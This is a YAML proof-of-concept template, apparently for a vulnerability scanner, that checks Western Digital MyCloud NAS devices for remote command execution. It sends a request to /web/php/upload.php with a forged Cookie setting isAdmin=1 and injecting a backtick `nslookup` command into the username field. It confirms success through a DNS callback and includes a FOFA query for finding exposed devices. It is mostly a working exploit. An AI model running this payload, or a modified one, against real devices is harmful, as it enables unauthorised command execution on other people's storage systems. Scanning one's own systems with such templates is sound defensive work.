id: poc-yaml-west-nas-users-php-rce
info:
  name: 西部数码 NAS users.php 远程代码执行漏洞
  severity: critical
  tags:
  - rce
  - DNSLOG
  finger: western_digital_mycloud_nas
  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
requests:
- method: GET
  path: /web/php/upload.php
  headers:
    Cookie: isAdmin=1;username=a" `nslookup {{.domain}}` "
  expression: status_code == 200 && contains(body,"<status>timeout</status>") && contains(body,"nslookup")
    && contains(content_type,"text/xml") && reverse.Verify()
transport: http
